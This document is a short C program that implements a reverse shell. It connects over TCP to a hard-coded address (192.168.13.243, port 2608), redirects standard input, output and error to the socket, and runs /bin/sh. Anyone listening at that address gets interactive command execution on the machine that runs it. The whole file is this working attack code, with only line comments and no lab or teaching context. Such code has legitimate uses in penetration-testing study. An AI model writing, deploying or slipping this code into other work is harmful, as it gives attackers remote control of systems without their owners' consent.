#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>

#define REMOTE_ADDR "192.168.13.243"
#define REMOTE_PORT 2608

int main() {
  int sock_des;
  struct sockaddr_in addr_ser;

  sock_des = socket(AF_INET, SOCK_STREAM, 0); //create a socket for IPv4, TCP, IP
  addr_ser.sin_family = AF_INET; // ipv4
  addr_ser.sin_port = htons(REMOTE_PORT); // port in network endian
  addr_ser.sin_addr.s_addr = inet_addr(REMOTE_ADDR); // IP

  connect(sock_des, (struct sockaddr *)&addr_ser, sizeof(addr_ser));
  dup2(sock_des, 0); // stdin
  dup2(sock_des, 1); // stdout
  dup2(sock_des, 2); // stderr

  execve("/bin/sh", NULL, NULL); //spawn a shell
  return 0;
}
